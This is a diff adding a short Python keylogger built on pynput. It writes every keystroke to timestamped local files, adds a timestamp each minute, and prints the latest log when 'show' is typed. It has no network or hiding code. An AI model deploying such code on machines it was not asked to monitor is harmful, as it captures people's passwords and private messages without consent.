@@ -1,0 +1,68 @@
+import os
+import threading
+from pynput.keyboard import Listener, Key
+from datetime import datetime
+import time
+
+now = datetime.now().strftime("%d-%m-%Y-%H.%M.%S")
+filename = 'keys_' + now + '.txt'
+last_listen_filename = 'Last_listen.txt'
+current_listening_name = 'listening.txt'
+current_listening = []
+
+def write_timestamp_every_minute():
+    while True:
+        timestamp = datetime.now().strftime("%d/%m/%Y-%H:%M:%S")
+        with open(filename, "a", encoding='utf-8') as file:
+            file.write(f'\n~{timestamp}:~\n')
+        time.sleep(60)
+
+def show_lesr_listen():
+    if os.path.exists(last_listen_filename):
+        with open(last_listen_filename, "r", encoding='utf-8') as show_last_file:
+            print(show_last_file.read())
+    else:
+        with open(current_listening_name, "r", encoding='utf-8') as show_file:
+            print(show_file.read())
+
+def on_press(key):
+    try:
+        text_key = key.char
+    except:
+        text_key = f' [{key}]'
+
+    with open(filename, "a", encoding='utf-8') as file:
+        current_listening.append(text_key)
+        file.write(text_key)
+        file.flush()
+
+    with open(current_listening_name, "a", encoding='utf-8') as showfile:
+        showfile.write(text_key)
+        showfile.flush()
+
+    if key == Key.esc:
+        return False
+
+    if ''.join(current_listening[-4:]) == 'show':
+        show_lesr_listen()
+
+def start_timer_thread():
+    thread = threading.Thread(target=write_timestamp_every_minute, daemon=True)
+    thread.start()
+
+def start_keyboard_listener():
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+def finalize_showfiles():
+    if os.path.exists(last_listen_filename):
+        os.remove(last_listen_filename)
+    os.rename(current_listening_name, last_listen_filename)
+
+def main():
+    start_timer_thread()
+    start_keyboard_listener()
+    finalize_showfiles()
+
+if __name__ == "__main__":
+    main()
